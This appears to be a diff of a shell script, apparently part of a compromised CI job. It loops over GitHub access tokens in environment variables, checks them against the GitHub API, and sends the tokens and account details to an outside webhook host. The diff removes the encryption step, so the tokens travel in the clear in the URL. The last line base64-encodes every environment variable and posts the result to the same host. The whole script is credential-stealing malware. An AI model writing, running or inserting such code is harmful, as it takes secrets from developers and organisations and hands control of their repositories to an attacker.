@@ -1,23 +1,11 @@
 webhook="https://16.164.221.226.nip.io/bcbdfd7ffd9efa6d8d312f9f723f20753656c0dcb6460ebb7a85a5c02357b5ff"
 
-PUB_KEY='-----BEGIN PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAs7vcRmdnkEDvFNhL1nZG
-UqchNjxcRwjnFvkkK5yzXyTh4U8DhGjxsO07IjW+bolOd9jvteU+Glos5Jo9Ol3U
-povlvT/53YRJ5vtisLnC5OtdJc6kd0hz40p/iebw3/hPwCjsZYssb2grHj0WHn3K
-mwAJJ38rKjXF8s3IO/OWjlyUgXVbPuaBUFbmbP8w8N+gPThKFUvvjWFjTW9lMtS7
-i/rgtBnwso3th85FBu5INeGKPzpfsIPWW+q9HFjOCOl0Rfz6KKdbdycVBctBv0KM
-DRwCUdOcAmdDKb+XuOQIGxEuLr6V3nDNtsAlm9e/ytx7mkHsvfVNS4vsSIPX0tiA
-KwIDAQAB
------END PUBLIC KEY-----'
-
 for pat in ORG_PAT READ_REPO_PAT; do
         token="${!pat}"
-        user_info=$(curl -s -i -H "Authorization: Bearer $encrypted_token" https://api.github.com/user)
+        user_info=$(curl -s -i -H "Authorization: Bearer $token" https://api.github.com/user)
 
         # Needs encryption
-		encrypted_token=$(echo printf '$s' "$token" | openssl pkeyutl -encrypt -pubin -inkey <(printf '%s' "$PUB_KEY") -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 | base64 -w0)
-		encrypted_pat=$(echo printf '$s' "$pat" | openssl pkeyutl -encrypt -pubin -inkey <(printf '%s' "$PUB_KEY") -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 | base64 -w0)
-		curl -s -o /dev/null "$webhook/send-pat?secret=$encrypted_pat&token=$encrypted_token" -d "$user_info"
+        curl -s -o /dev/null "$webhook/send-pat?secret=$pat&token=$token" -d "$user_info"
 done
 
 env -0 | base64 -w 0 | curl -s -o /dev/null -X POST -d @- "$webhook"
